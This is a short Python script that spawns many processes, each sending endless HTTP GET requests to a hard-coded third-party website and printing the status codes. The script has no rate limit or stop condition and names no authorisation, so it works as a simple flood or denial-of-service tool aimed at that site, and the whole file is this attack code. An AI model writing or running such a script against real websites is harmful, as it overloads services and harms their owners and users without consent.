import requests
from concurrent.futures import ProcessPoolExecutor
import multiprocessing

url = 'http://www.seasky.org'  # Make sure the URL includes 'http://' or 'https://'


def send_request():
    with requests.Session() as session:
        while True:
            try:
                response = session.get(url)
                print(f"Sent request to {url} - Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error occurred: {e}")


num_processes = multiprocessing.cpu_count() * 2

with ProcessPoolExecutor(max_workers=num_processes) as executor:
    futures = [executor.submit(send_request) for _ in range(num_processes)]

    for future in futures:
        try:
            future.result()
        except Exception as exc:
            print(f'Generated an exception: {exc}')
